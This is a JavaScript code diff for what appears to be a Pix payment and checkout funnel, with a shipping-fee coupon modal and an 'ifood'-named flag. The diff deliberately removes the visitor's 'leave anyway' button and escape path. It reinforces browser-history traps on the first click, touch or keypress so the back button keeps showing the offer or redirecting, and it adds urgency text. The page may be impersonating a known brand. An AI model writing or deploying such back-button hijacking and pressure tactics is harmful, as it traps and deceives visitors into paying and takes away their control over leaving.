@@ -173,16 +173,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
 function setupGlobalBackRedirect(page) {
     if (!page || page === 'admin') return;
-    if (page === 'pix') return;
+    if (window.__ifoodBackRedirectInit) return;
+    window.__ifoodBackRedirectInit = true;
 
     const targetUrl = buildBackRedirectUrl();
-    let allowBack = false;
     let shownOffer = false;
 
     const modalEls = ensureCouponModalElements();
     const modal = modalEls.modal;
     const btnApply = modalEls.btnApply;
-    const btnExit = modalEls.btnExit;
     const priceOld = modalEls.priceOld;
     const priceNew = modalEls.priceNew;
 
@@ -205,10 +204,6 @@ function setupGlobalBackRedirect(page) {
     };
 
     const handlePop = () => {
-        if (allowBack) {
-            window.removeEventListener('popstate', handlePop);
-            return;
-        }
         if (shownOffer) {
             window.location.href = targetUrl;
             return;
@@ -224,6 +219,16 @@ function setupGlobalBackRedirect(page) {
     };
 
     pushHistoryGuards();
+    const reinforceGuards = () => {
+        try {
+            pushHistoryGuards();
+        } catch (error) {
+            return;
+        }
+    };
+    window.addEventListener('pointerdown', reinforceGuards, { passive: true, once: true });
+    window.addEventListener('touchstart', reinforceGuards, { passive: true, once: true });
+    window.addEventListener('keydown', reinforceGuards, { once: true });
     window.addEventListener('pageshow', (event) => {
         if (event.persisted) {
             pushHistoryGuards();
@@ -238,15 +243,6 @@ function setupGlobalBackRedirect(page) {
             trackLead('coupon_offer_accept', { stage: page });
             setStage('checkout');
             redirect('checkout.html');
-        });
-    }
-
-    if (btnExit) {
-        btnExit.addEventListener('click', () => {
-            hideCouponModal();
-            trackLead('coupon_offer_exit', { stage: page });
-            allowBack = true;
-            window.location.href = targetUrl;
         });
     }
 }
@@ -265,8 +261,8 @@ function ensureCouponModalElements() {
                         <span id="coupon-old" class="price-old">R$ 25,90</span>
                         <span id="coupon-new" class="price-new">R$ 20,72</span>
                     </div>
+                    <span class="coupon-subtitle">Oferta válida agora nesta sessão</span>
                     <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
-                    <button id="btn-coupon-exit" class="btn-secondary" type="button">Sair mesmo assim</button>
                 </div>
             </div>
         `;
@@ -277,7 +273,6 @@ function ensureCouponModalElements() {
     return {
         modal,
         btnApply: document.getElementById('btn-coupon-apply'),
-        btnExit: document.getElementById('btn-coupon-exit'),
         priceOld: document.getElementById('coupon-old'),
         priceNew: document.getElementById('coupon-new')
     };
@@ -1451,72 +1446,6 @@ function initPix() {
         timerId = setInterval(updateTimer, 1000);
     }
 
-    setupBackRedirectCoupon(shipping);
-}
-
-function setupBackRedirectCoupon(shipping) {
-    const modalEls = ensureCouponModalElements();
-    const modal = modalEls.modal;
-    const btnApply = modalEls.btnApply;
-    const btnExit = modalEls.btnExit;
-    const priceOld = modalEls.priceOld;
-    const priceNew = modalEls.priceNew;
-
-    if (!modal || !btnApply || !btnExit) return;
-
-    const basePrice = Number(shipping?.originalPrice || shipping?.price || 25.9);
-    const discount = 0.2;
-    const discounted = roundMoney(basePrice * (1 - discount));
-    if (priceOld) priceOld.textContent = formatCurrency(basePrice);
-    if (priceNew) priceNew.textContent = formatCurrency(discounted);
-
-    const targetUrl = buildBackRedirectUrl();
-    let allowBack = false;
-    let shownOffer = false;
-
-    const showModal = () => {
-        modal.classList.remove('hidden');
-        modal.setAttribute('aria-hidden', 'false');
-        trackLead('coupon_offer_shown', { stage: 'pix', shipping });
-    };
-
-    const hideModal = () => {
-        modal.classList.add('hidden');
-        modal.setAttribute('aria-hidden', 'true');
-    };
-
-    const handlePop = () => {
-        if (allowBack) {
-            window.removeEventListener('popstate', handlePop);
-            return;
-        }
-        if (shownOffer) {
-            window.location.href = targetUrl;
-            return;
-        }
-        shownOffer = true;
-        showModal();
-        history.pushState({}, '', location.href);
-    };
-
-    history.pushState({}, '', location.href);
-    history.pushState({}, '', location.href);
-    window.addEventListener('popstate', handlePop);
-
-    btnApply.addEventListener('click', () => {
-        saveCoupon({ code: 'FRETE20', discount, appliedAt: Date.now() });
-        hideModal();
-        trackLead('coupon_offer_accept', { stage: 'pix', shipping });
-        setStage('checkout');
-        redirect('checkout.html');
-    });
-
-    btnExit.addEventListener('click', () => {
-        hideModal();
-        trackLead('coupon_offer_exit', { stage: 'pix', shipping });
-        allowBack = true;
-        window.location.href = targetUrl;
-    });
 }
 
 function buildBackRedirectUrl() {
